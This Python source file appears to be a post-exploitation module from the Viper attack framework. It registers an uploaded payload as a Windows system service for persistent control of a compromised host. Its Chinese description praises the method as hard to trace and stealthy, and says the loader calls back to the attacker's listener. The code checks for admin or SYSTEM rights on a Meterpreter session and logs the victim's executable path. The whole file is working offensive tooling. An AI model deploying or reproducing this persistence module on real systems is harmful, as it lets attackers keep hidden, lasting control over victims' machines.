# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Windows系统服务持久化"
    DESC = "模块通过将上传的Payload文件注册为系统服务的方式进行持久化控制.\n" \
           "此模块需要Session系统权限或管理员权限.\n" \
           "服务持久化虽然在写入时无法免杀,但是成功写入口由于排查困难,隐蔽效果好.\n" \
           "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1050"]  # ATTCK向量
    AUTHOR = "Viper"
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    OPTIONS = register_options([
        OptionHander(),
        OptionCacheHanderConfig(),

    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_service_simple_api"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Meterpreter类型的Session"

        # 检查权限
        if session.is_admin or session.is_system:
            pass
        else:
            return False, "当前Session必须拥有系统权限或管理员权限"

        self.set_payload_by_handler()
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,建议选择windows平台的handler"

        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
            self.log_good("脚本输出: {} EXE路径: {}".format(data.get("psresult"), data.get("victim_path")))
            self.cache_handler()
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
